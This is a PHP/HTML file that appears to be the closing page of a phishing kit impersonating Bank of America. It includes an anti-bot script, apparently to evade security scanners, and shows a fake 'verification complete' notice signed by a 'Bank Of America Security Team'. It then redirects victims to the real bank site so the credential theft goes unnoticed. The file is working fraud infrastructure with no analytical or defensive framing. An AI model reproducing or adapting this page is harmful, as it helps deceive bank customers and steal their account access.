<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include "./antibots.php";
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Congratulations !</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<meta http-equiv="refresh" content="5; URL=https://www.bankofamerica.com/">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/fin.css" rel="stylesheet">
</head>
<body>
<div id="wb_Form2" style="position:absolute;left:404px;top:19px;width:256px;height:74px;z-index:2;">
<form name="Form1" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form2">
<div id="wb_Text1" style="position:absolute;left:6px;top:12px;width:250px;height:32px;z-index:0;text-align:left;">
<span style="color:#A9A9A9;font-family:Arial;font-size:27px;">Congratulations !</span></div>
</form>
</div>
<div id="wb_Image1" style="position:absolute;left:0px;top:533px;width:1344px;height:169px;z-index:3;">
<img src="images/4.GIF" id="Image1" alt=""></div>
<div id="wb_Text3" style="position:absolute;left:118px;top:113px;width:250px;height:21px;z-index:4;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:17px;"><strong>Welcome Again!</strong></span></div>
<div id="wb_Image2" style="position:absolute;left:73px;top:80px;width:1214px;height:13px;z-index:5;">
<img src="images/18.GIF" id="Image2" alt=""></div>
<div id="wb_Image4" style="position:absolute;left:73px;top:454px;width:1214px;height:39px;z-index:6;">
<img src="images/18.GIF" id="Image4" alt=""></div>
<div id="wb_Form3" style="position:absolute;left:73px;top:105px;width:989px;height:198px;z-index:7;">
<form name="Form3" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form3">
</form>
</div>
<div id="wb_Form1" style="position:absolute;left:118px;top:149px;width:1112px;height:211px;z-index:8;">
<form name="Form1" method="post" action="mailto:yourname@yourdomain.com" enctype="text/plain" id="Form1">
<div id="wb_Text2" style="position:absolute;left:37px;top:24px;width:819px;height:138px;z-index:1;text-align:left;">
<span style="color:#DC143C;font-family:Arial;font-size:20px;"><strong>Bank Of America Verification<br></strong></span><span style="color:#000000;font-family:Arial;font-size:13px;"><br></span><span style="color:#696969;font-family:Arial;font-size:15px;"><strong>verification complete !</strong></span><span style="color:#000000;font-family:Arial;font-size:13px;"><br><strong>Note </strong>: You may now use your account as usual .You will be redirected to our main login page in few moments<br><br>We are sorry for the inconvenience that this might have caused you . We will update your account within the next 24 hours <br><br><strong> Bank Of America Security Team</strong></span></div>
</form>
</div>
</body>
</html>